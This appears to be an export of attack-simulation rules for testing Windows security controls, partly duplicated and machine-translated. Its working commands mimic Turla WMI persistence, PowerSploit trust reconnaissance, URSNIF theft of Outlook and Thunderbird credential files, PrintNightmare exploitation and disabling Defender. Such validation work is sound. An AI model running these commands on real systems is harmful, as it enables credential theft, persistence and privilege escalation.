exact_source_fields.desc: This validation rule simulates how to use a WMI event filter and the user to set persistence. When the normal operating time of the system is between 300 and 400 seconds or at 15:30:40, TURLA malware uses these mechanisms to run encrypted PowerShell commands stored in the registry. This validation rule simulates the mechanism of using the "echo" command to start PowerShell.

host_cli_action.raw_text:
# ============================================================
### Set registry key

#Set-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion -Name "Payload" -Value "yeet"
#  auto,4,true,60
#  success_zero
  
# ============================================================
### Set up Event Consumer and command to be executed

# Create EventConsumer named "Syslog Consumer"
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" | Remove-WmiObject;
  auto,4,true,60
  success_zero

# Tie Powershell command to EventConsumer
$Subscription = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc ZQBjAGgAbwAgAEMATwBNAE0AQQBOAEQAXwBSAFUATgA=";RunInteractively='false'};
  auto,4,true,60
  success_zero

# ============================================================
### Set up the first trigger

# Create an EventFilter named "Log Adapter Filter"
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| Remove-WmiObject;
	auto,4,true,60
  success_zero
  
# Bind EventFilter to EventConsumer
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log Adapter'} | Remove-WmiObject;
	auto,4,true,60
  success_zero

# Create query/condition - When time is 15:30:40
$Query1 = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
	auto,4,true,60
  success_zero
  
# Create query/condition, part 2
$EventFilter1 = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$Query1};
	auto,4,true,60
  success_zero
  
# Tie condition to action specified in $subscription
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$EventFilter1;Consumer=$Subscription};
	auto,4,true,60
  success_zero

# ============================================================
### Set up the second trigger

# Create an EventFilter named "AD Bridge Filter"
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject;
	auto,4,true,60
  success_zero

# Bind EventFilter to EventConsumer
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD Bridge'} | Remove-WmiObject;
	auto,4,true,60
  success_zero

# Create query/condition - When uptime is between 300 and 400 seconds
$Query2 = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";
	auto,4,true,60
  success_zero

# Create query/condition, part 2
$EventFilter2 = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$Query2};
	auto,4,true,60
  success_zero

# Tie condition to action specified in $subscription
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$EventFilter2;Consumer=$Subscription};
	auto,4,true,60
  success_zero

# ============================================================
### Cleanup

Get-WmiObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Log Adapter Filter'" | Remove-WmiObject
  auto,4,true,3
  cleanup

Get-WmiObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='AD Bridge Filter'" | Remove-WmiObject
  auto,4,true,3
  cleanup
  
Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Syslog Consumer'" | Remove-WmiObject
  auto,4,true,3
  cleanup
  
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "Filter ='__EventFilter.Name=""Log Adapter Filter""'" | Remove-WmiObject
  auto,4,true,3
  cleanup

Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "Filter ='__EventFilter.Name=""AD Bridge Filter""'" | Remove-WmiObject
  auto,4,true,3
  cleanup

steps.command: $Query1 = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";

$Query2 = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";

exact_source_fields.desc: This validation rule simulates a reconnaissance phase of Adversary after obtaining its initial foothold in the domain network. validate action execution enumeration to determine trust relationships between forests. The PowerShell script POWERSPLOIT is used to extract this information. POWERSPLOIT is a collection of PowerShell modules that use Threat Adversary to assist in reconnaissance, code execution, scripting, persistence, AV bypass, leakage, destruction, and privilege escalation. The Active Directory structure starts from domains, which are centrally managed groups. These groups include users, user groups, and hosts, such as computers and servers. A set of domains forms a so-called tree, and the combined trees form a so-called forest. Trust defines the permissions allowed between specific objects, resources, and domains. Adversary can use this information to help understand network layout, and can also provide assistance when attempting to horizontally move the network in the future** Dependency condition: * * The validator must join a domain to properly configure the AD environment

host_cli_action.raw_text:
cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero

(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
  auto,4,true,60
  error_match:false
  
$exe_policy = Get-ExecutionPolicy
  auto,4,true,60
  success_zero

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
  auto,4,true,60
  success_zero

. .\Get-NetForestTrust.ps1
  auto,4,true,60
  success_zero

Get-NetForestTrust
  auto,4,true,60
  success_match:name
  
Remove-Item "C:\Users\Public\Documents\Get-NetForestTrust.ps1"
  auto,4,true,60
  cleanup
  
Set-ExecutionPolicy -ExecutionPolicy $exe_policy -Scope Process -Force
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the reconnaissance phase of adversary after obtaining its initial foothold in the domain. validate action execution enumeration to determine the trust relationship set for the current domain. The PowerShell script POWERSPLOIT is used to extract this information. POWERSPLOIT is a collection of PowerShell modules that use Threat adversary to assist in reconnaissance, code execution, scripting, persistence, AV bypass, leakage, destruction, and privilege escalation. The AD structure starts from domains, which are centrally managed groups. These groups include users, user groups, and hosts, such as computers and servers. A set of domains forms a so-called tree, and the combined trees form a so-called forest. Trust defines the permissions allowed between specific objects, resources, and domains. Adversary can use this information to help understand network layout and also provide assistance when attempting to horizontally move the network in the future. Attention - This validation rule uses incompatible features** Dependency condition: * * The validator must join a domain to properly configure the AD environment

host_cli_action.raw_text:
cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero

(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
  auto,4,true,60
  incompatible_match:false
  
$exe_policy = Get-ExecutionPolicy
  auto,4,true,60
  success_zero

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
  auto,4,true,60
  success_zero

$domain = (Get-WmiObject -Class Win32_ComputerSystem).Domain
  auto,4,true,60
  success_zero

. .\Get-NetDomainTrust.ps1
  auto,4,true,60
  success_zero
  
Get-NetDomainTrust -domain $domain
  auto,4,true,60
  success_match:TrustDirection
  
Remove-Item "C:\Users\Public\Documents\Get-NetDomainTrust.ps1"
  auto,4,true,60
  cleanup
  
Set-ExecutionPolicy -ExecutionPolicy $exe_policy -Scope Process -Force
  auto,4,true,60
  cleanup

exact_source_fields.desc:
This validation rule simulates a use of control panel items by adversary to execute arbitrary code on an infected computer. Trigger the code by changing the registry and launching the control panel. It is worth noting that even non administrator users are usually allowed to make changes to their own registry configuration units. By indirectly executing payloads through the control panel, Adversary attempts to bypass the application whitelist.
Please note that PowerShell needs to be used from cmd to ensure proper cleaning.

host_cli_action.raw_text:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v A104-219 /t REG_SZ /d "C:\Users\Public\Documents\A104-219.cpl" /f
  auto,4,true,60
  success_match:Success

Get-ControlPanelItem
  auto,4,true,60
  success_zero

Get-Content C:\Users\Public\Documents\A104-219.txt
  auto,4,true,60
  success_match:persistence mechanism

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v A104-219 /f
  auto,4,true,60
  cleanup

(New-Object -ComObject Shell.Application).Windows() | ForEach-Object {$_.quit()}
  auto,4,true,60
  cleanup

del C:\Users\Public\Documents\A104-219.txt, C:\Users\Public\Documents\A104-219.cpl
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a variant of URSNIF (called ISFB3 and URSNIF-A) that steals data from Microsoft Outlook using a series of commands. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, take screenshots, and clipboard data. This validation rule requires Microsoft Outlook to be present on the target system. If Microsoft Outlook cannot be found, this validation rule will not be run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Microsoft Outlook

host_cli_action.raw_text:
$outlook_installed=$False;$EAP_Holder = $ErrorActionPreference; $ErrorActionPreference = 'SilentlyContinue'
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files\Microsoft Office\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files (x86)\Microsoft Office\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files\WindowsApps\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero

$items = $(ls -r -force "C:\Users\*\AppData\Local\Microsoft\WindowsApps\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
if ($outlook_installed) {echo success} else {echo failure}
  auto,4,true,60
  incompatible_match:failure
  
$items = $(ls -r -force "C:\Users\*" -include *.pst, *.ost);
  auto,4,true,60
  success_zero
  
foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name) -Encoding byte -TotalCount 200}; $ErrorActionPreference = $EAP_Holder
  auto,6,true,120
  success_zero
  
(&{If($Items.Count -gt 0) {"True"} Else {"False"}})
  auto,4,true,60
  success_match:True
  
del C:\Users\Public\Downloads\Outlook.pst
  auto,3,true,4
  cleanup

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (known as ISFB3 and URSNIF-A) to steal stored credentials and personal address books from Mozilla Thunderbird email clients. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, take screenshots, and clipboard data. This validation rule requires Mozilla Thunderbird on the target system. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Mozilla Thunderbird

host_cli_action.raw_text:
dir "C:\Program Files\Mozilla Thunderbird\"
  auto,4,true
  incompatible_match:does not exist
  
$items = $(ls -r C:\users\*\AppData\Roaming\Thunderbird\Profiles\*\logins.json)
  auto,4,true
  success_zero

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true
  success_match:encryptedPassword
  
$items = $(ls -r C:\users\*\AppData\Roaming\Thunderbird\Profiles\*\abook.*)
  auto,4,true
  success_zero

$items
  auto,4,true
  success_match:Directory

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true
  success_zero

exact_source_fields.desc: This validation rule simulates a variant of URSNIF (called ISFB3 and URSNIF-A) that steals data from Microsoft Outlook using a series of commands. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, take screenshots, and clipboard data. This validation rule requires Microsoft Outlook to be present on the target system. If Microsoft Outlook cannot be found, this validation rule will not be run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Microsoft Outlook

host_cli_action.raw_text:
$outlook_installed=$False;$EAP_Holder = $ErrorActionPreference; $ErrorActionPreference = 'SilentlyContinue'
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files\Microsoft Office\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files (x86)\Microsoft Office\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files\WindowsApps\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero

$items = $(ls -r -force "C:\Users\*\AppData\Local\Microsoft\WindowsApps\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
if ($outlook_installed) {echo success} else {echo failure}
  auto,4,true,60
  incompatible_match:failure
  
$items = $(ls -r -force "C:\Users\*" -include *.pst, *.ost);
  auto,4,true,60
  success_zero
  
foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name) -Encoding byte -TotalCount 200}; $ErrorActionPreference = $EAP_Holder
  auto,6,true,120
  success_zero
  
(&{If($Items.Count -gt 0) {"True"} Else {"False"}})
  auto,4,true,60
  success_match:True
  
del C:\Users\Public\Downloads\Outlook.pst
  auto,3,true,4
  cleanup

exact_source_fields.desc: This validation rule simulates a variant of URSNIF (called ISFB3 and URSNIF-A) that steals data from Microsoft Outlook using a series of commands. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, take screenshots, and clipboard data. This validation rule requires Microsoft Outlook to be present on the target system. If Microsoft Outlook cannot be found, this validation rule will not be run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Microsoft Outlook

host_cli_action.raw_text:
$outlook_installed=$False;$EAP_Holder = $ErrorActionPreference; $ErrorActionPreference = 'SilentlyContinue'
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files\Microsoft Office\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files (x86)\Microsoft Office\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
$items = $(ls -r -force "C:\Program Files\WindowsApps\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero

$items = $(ls -r -force "C:\Users\*\AppData\Local\Microsoft\WindowsApps\" -include outlook.exe); if ($items.name -contains "outlook.exe") { $outlook_installed=$True }
  auto,4,true,60
  success_zero
  
if ($outlook_installed) {echo success} else {echo failure}
  auto,4,true,60
  incompatible_match:failure
  
$items = $(ls -r -force "C:\Users\*" -include *.pst, *.ost);
  auto,4,true,60
  success_zero
  
foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name) -Encoding byte -TotalCount 200}; $ErrorActionPreference = $EAP_Holder
  auto,6,true,120
  success_zero
  
(&{If($Items.Count -gt 0) {"True"} Else {"False"}})
  auto,4,true,60
  success_match:True
  
del C:\Users\Public\Downloads\Outlook.pst
  auto,3,true,4
  cleanup

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (known as ISFB3 and URSNIF-A) to steal stored credentials and personal address books from Mozilla Thunderbird email clients. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, take screenshots, and clipboard data. This validation rule requires Mozilla Thunderbird on the target system. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Mozilla Thunderbird

host_cli_action.raw_text:
dir "C:\Program Files\Mozilla Thunderbird\"
  auto,4,true
  incompatible_match:does not exist
  
$items = $(ls -r C:\users\*\AppData\Roaming\Thunderbird\Profiles\*\logins.json)
  auto,4,true
  success_zero

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true
  success_match:encryptedPassword
  
$items = $(ls -r C:\users\*\AppData\Roaming\Thunderbird\Profiles\*\abook.*)
  auto,4,true
  success_zero

$items
  auto,4,true
  success_match:Directory

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true
  success_zero

When you run a weak signal validation rule alone, it is unlikely to be blocked by Security Controls. The best practice is to ensure that your Security Controls provide visibility into such behavior. This allows you to associate activities with higher fidelity signals for detection or for threat hunting.

此验证动作还原了攻击者利用 Microsoft Windows 打印机（后台处理程序）功能中的漏洞，称为 PrintNightmare/CVE-2021-34527 和 CVE-2021-1675。

PrintNightmare/CVE-2021-34527 和 CVE-2021-1675 是影响 Windows 中的打印机后台处理程序服务的远程代码执行错误。该漏洞利用 Windows 服务器上 spoolsv.exe 服务中的错误配置，使具有域凭据的攻击者能够执行恶意打印驱动程序 DLL，并在域控制器或打印服务器上实现对 SYSTEM 的权限升级。具体来说，该错误通过 RpcAddPrinterDriver 系统调用将驱动程序添加到目标域控制器来起作用。

exact_source_fields.desc: This validation rule simulates a vulnerability in the Microsoft Windows printer (spooler) feature exploited by adversary, known as PrintNightmare/CVE-2021-34527 and CVE-2021-1675. PrintNightmare/CVE-2021-34527 and CVE-2021-1675 are remote code execution errors that affect the printer spooler service in Windows. This vulnerability exploits an incorrect configuration in the spoolsvxe service on a Windows server, allowing Adversary with domain credentials to execute malicious print driver DLLs and achieve permission upgrades to SYSTEM on domain controllers or print servers. Specifically, this error takes effect by adding the driver to the target domain controller through the RpcAddPrinterDriver system call.

host_cli_action.raw_text:
$orig_status = Get-Service spooler
	auto,4,true,60
  success_zero

Get-Service spooler
	auto,4,true,60
  success_match:Running
  blocked_match:Stopped

Import-Module C:\Users\Public\Documents\invoke-printnightmare_v4.ps1
  auto,4,true,60
  success_zero

Invoke-Nightmare -DLL "C:\Users\Public\Documents\LaunchNotepad_x64.dll"
  auto,4,true,60
  success_zero
  error_match:ERROR: Failed to remove payload from

tasklist /v | findstr notepad
  auto,4,true,60
  success_match:notepad

$service = Get-Service spooler
	auto,4,true,60
  success_zero

if ($service.Status -eq 'Stopped') {Start-Service spooler}
	auto,4,true,60
  success_zero

Get-PrinterDriver -Name "Totally Not Malicious" | Format-List
	auto,4,true,60
  success_match:Totally
  
Remove-PrinterDriver -Name "Totally Not Malicious"
	auto,4,true,3
	cleanup
  
Remove-Module -Force invoke-printnightmare_v4
	auto,4,true,3
	cleanup

Remove-Item C:\Users\Public\Documents\invoke-printnightmare_v4.ps1
	auto,4,true,3
	cleanup
  
Remove-Item C:\Users\Public\Documents\LaunchNotepad_x64.dll
	auto,4,true,3
	cleanup

taskkill /IM "notepad.exe" /F
	auto,4,true,3
	cleanup
  
if ($orig_status.Status -eq 'Stopped'){Stop-Service spooler} else {Start-Service spooler}
	auto,4,true,60
  cleanup
  
Get-Service spooler
	auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a methods used by certain variants of the MAZE ransomware. Malicious software will create a directory whose path contains the string ASSIFIED or SECRET and {0AFACED1-E828-11D1-9187-B532F1E9575D}. The malware seems to have created a target.lnk file in a new directory. This is likely to lure users to trigger malware or serve as a persistence mechanism. This validation rule depends on the existence of "defaultuser0". "Defaultuser0" is the system user profile used during OOBE to set up Windows before creating any user accounts. It should and usually disappears after the first reboot after installation. Its existence may reflect an opportunity to strengthen endpoints by deleting the defaultuser0 account and its associated paths. If "defaultuser0" does not exist, its path can be modified to include the active user.

host_cli_action.raw_text:
$DU_Zero = (Test-Path -Path "C:\Users\defaultuser0\")
  auto,4,true,60
  success_zero
  
New-Item -Path "C:\Users\defaultuser0\AppData\Roaming\CLASSIFIED\" -Name '{0AFACED1-E828-11D1-9187-B532F1E9575D}' -ItemType "directory" -force
  auto,4,true,60
  success_zero
  
copy-item C:\Users\Public\Documents\target -destination 'C:\Users\defaultuser0\AppData\Roaming\CLASSIFIED\{0AFACED1-E828-11D1-9187-B532F1E9575D}\target.lnk'
  auto,4,true,60

This allows you to associate Campaign with higher fidelity signals for detection or for threat hunting.

此验证动作还原了 MAZE 勒索软件的某些变种使用的方法。恶意软件会创建一个目录，其路径包含字符串 CLASSIFIED 或 SECRET 以及 {0AFACED1-E828-11D1-9187-B532F1E9575D}。该恶意软件似乎在新目录中创建了一个 target.lnk 文件。这很可能是为了引诱用户触发恶意软件或作为一种持久化机制。

此验证动作依赖于“defaultuser0”的存在。 “Defaultuser0”是在创建任何用户帐户之前，在 OOBE 期间设置 Windows 时使用的系统用户配置文件。它应该并且通常会在安装后第一次重新启动后消失。它的存在可能反映了通过删除 defaultuser0 帐户和与其关联的路径来强化端点的机会。

如果“defaultuser0”不存在，则可以修改其路径以包含活动用户。

exact_source_fields.desc: This validation rule simulates an attempt to disable Windows Defender - Protect Engine on Access using PowerShell. In this validation rule, PowerShell is used to make registry changes that affect the behavior of Windows Defender. This validation rule mimics what FORMBOOK malware does when infecting a computer and attempting to disable endpoint controls (such as Windows Defender).

host_cli_action.raw_text:
$defender_path = "HKLM:SOFTWARE\Policies\Microsoft\Windows Defender"
  auto,4,true,60
  success_zero

$defender_rtp_path = "HKLM:SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
  auto,4,true,60
  success_zero

if (Test-Path $defender_rtp_path) {$defender_rtp = Get-ItemProperty -Path $defender_rtp_path} else {$defender_rtp = New-Item -Path $defender_path -Name "Real-Time Protection"}
  auto,4,true,60
  success_zero
  
$disable_protect = $defender_rtp.DisableonAccessProtection; $disable_protect
  auto,4,true,60
  success_zero
  incompatible_match:1
  
if ($disable_protect -eq $null) {New-ItemProperty -Path $defender_rtp_path -Name DisableonAccessProtection -PropertyType DWord -Value 1} else {Set-ItemProperty -Path $defender_rtp_path -Name DisableonAccessProtection -Value 1}
  auto,4,true,60
  success_match:DisableonAccessProtection
  
if ($disable_protect -eq $null) {Remove-ItemProperty -Path $defender_rtp.PSPath -Name DisableonAccessProtection} else {Set-ItemProperty -Path $defender_rtp.PSPath -Name DisableonAccessProtection -Value $disable_protect}
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the PowerShell timestamp to modify metadata and make detecting malicious activities more difficult. Timestamp is an anti forensics technique used by adversary, aimed at mixing suspicious files with other files in the directory or appearing as if certain files have never been accessed. It is also used to attempt to change the timeline of events after a successful attack. This technique involves changing different timestamps of files, including creation time, last access time, last modification time, and change time. This validation rule will create a new file and then change the timestamp of the file to a different time. The file will be deleted through a cleaning task.

host_cli_action.raw_text:
$file = $(New-Item "C:\Users\Public\Documents\hello.txt" -ItemType File)
  auto,4,true,60
  success_zero
  
Get-ChildItem $file | Select-Object Mode, Name, CreationTime, LastAccessTime, LastWriteTime | ft -autosize
  auto,4,true,60
  success_match:hello
  
$new_date = [Datetime]::ParseExact('01/31/2016', 'MM/dd/yyyy', $null)
  auto,4,true,60
  success_zero

$file.CreationTime=$new_date;$file.LastAccessTime=$new_date;$file.LastWriteTime=$new_date
  auto,4,true,60
  success_zero

Get-ChildItem $file | Select-Object Mode, Name, CreationTime, LastAccessTime, LastWriteTime | ft -autosize
  auto,4,true,60
  success_zero
  
$(Get-Date 2016-01-31) -eq $file.CreationTime
  auto,4,true,60
  success_match:True
  
# Put cleanup here (optional):
rm "C:\Users\Public\Documents\hello.txt" 
  auto,4,true,3
  cleanup

此验证动作还原了一个攻击者尝试发现在受感染主机上运行的服务。 验证机器人将尝试识别服务以确定可以安装哪些工具和应用程序。 此信息可能会导致发现易受攻击的工具、应用程序或配置，以利用或防御措施，例如基于主机的入侵检测，应该避免。

注意：此验证动作被视为“弱信号”操作。 这意味着它展示的行为并不总是表示恶意活动，并且可以匹配合法用户或管理活动。 当您单独运行弱信号验证动作时，它不太可能被安全防御设备阻止。 最佳实践是确保您的安全防御设备提供对此类行为的可见性。 这使您可以将共计活动与更高保真度的信号关联起来以进行检测或用于威胁搜寻。

exact_source_fields.desc: This validation rule simulates an adversary attempt to discover a service running on an infected host. The validator will attempt to identify the service to determine which tools and applications can be installed. This information may lead to the discovery of vulnerable tools, applications, or configurations to exploit or defend against measures, such as host based intrusion detection, which should be avoided. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious campaign and can match legitimate users or manage campaigns. When you run a weak signal validation action alone, it is unlikely to be blocked by security defense devices. The best practice is to ensure that your security defense equipment provides visibility into such behavior. This allows you to associate total campaign with higher fidelity signals for detection or for threat search.
exact_source_fields.name: Host Command Line - Discovering System Services Using PowerShell
exact_source_fields.notes: Digidations recommends running this rule as a SYSTEM, non-administrator, or administrator user on Windows Server 2016 and Windows 10 Validator.

exact_source_snippet.action_description:
此验证动作还原了 PowerShell 时间戳来修改元数据并使恶意活动的检测更加困难。时间戳是攻击者使用的一种反取证技术，目的是使可疑文件与目录中的其他文件混合或看起来好像某些文件像是从未访问过。它还用于尝试在攻击成功后更改事件的时间线。此技术包括更改文件的不同时间戳，包括创建时间、上次访问时间、上次修改时间和更改时间。

此验证动作将创建一个新文件，然后将文件的时间戳更改为不同的时间。 该文件将通过清理任务被删除。

exact_source_fields.action_description: 此验证动作还原了 URSNIF 变种(称为 LOLSnif 和 Goziat)使用的一系列命令来设置使用 Mshta 和 Powershell 来逃避检测的注册表有效载荷。URSNIF 是一种经过修改的模块化银行恶意软件，具有后门功能。其功能包括拦截和修改浏览器流量、文件下载和上传、建立 SOCKS 代理、系统重启和关闭、系统信息收集和域生成算法 (DGA)。该恶意软件还能够从流行的电子邮件和 FTP 客户端以及浏览器中窃取数据和凭据。还可以键盘记录、屏幕截图和剪贴板数据。

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (called LOLSnif and Goziat) to set up registry payloads that use Mshta and Powershell to evade detection. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, screenshots, and clipboard data.

exact_source_fields.desc: This validation rule simulates variants of URSNIF (called ISFB3 and URSNIF-A), using a series of commands to steal data from Microsoft Outlook. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. Keystroke, screenshots, and clipboard data may also be captured** Note - This validation rule requires Microsoft Outlook to have a fully configured configuration file on the target system and use incompatible features. * *>** Prerequisite: * * The executor must install Microsoft Outlook with a fully configured configuration file.

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (called LOLSnif and Goziat) to set up registry payloads that use Mshta and Powershell to evade detection. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers. You can also record keyboard data, screenshots, and clipboard data.

exact_source_fields.desc: This validation rule simulates adding the REMCOS payload to the registry run key as a persistence method. In the VBS REMCOS infection chain, the initial REMCOS VBS script will create the directory C:\Users\Public\Run and set HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup and HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup to C:\Users\Public\Run. This will allow malicious software to execute at system startup, ensuring longevity. In this restoration, the Run directory is empty. In the wild, this script uses base64 encoding, but has been decoded for this validation rule. REMCOS is a configurable remote access Trojan (RAT) program written in C++, with a large number of implemented functions, including file management, screenshot, accessing clipboard data, command shell, arbitrary file access, mouse control, etc

exact_source_snippet.action_description:
此验证动作还原了将 REMCOS 有效载荷添加到注册表运行键作为持久化方法。在 VBS REMCOS 感染链中，初始 REMCOS VBS 脚本将创建目录 C:\Users\Public\Run 并设置 HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup 和 HKCU:\Software\Microsoft \Windows\CurrentVersion\Explorer\User Shell Folders\Startup 到"C:\Users\Public\Run"。这将允许恶意软件在系统启动时执行，从而确保持久化。
在这个还原了中，Run 目录是空的。在野外，此脚本使用 base64 编码，但已针对此验证动作进行了解码。
REMCOS 是一个用 C++ 语言编写的可配置远程访问木马 (RAT) 程序，具有大量实现的功能，包括：文件管理、截屏、访问剪贴板数据、命令 shell、任意文件访问、鼠标控制等.
exact_source_snippet.action_name: Host Command Line - REMCOS, Persistence via Registry Run Key

exact_source_snippet.action_description: 此验证动作还原了主机尝试使用 GHOST 勒索软件在受感染主机上建立持久化所使用的相同方法创建计划任务。 GHOST 勒索软件的行为与大多数其他勒索软件系列非常相似，通过删除勒索信、加密受害者的文件并将其名称附加为文件扩展名（1.jpg 变为 1.jpg.ghost）。如果受害者希望通过解密密钥检索他们的文件，攻击者会要求支付 0.08116 比特币。

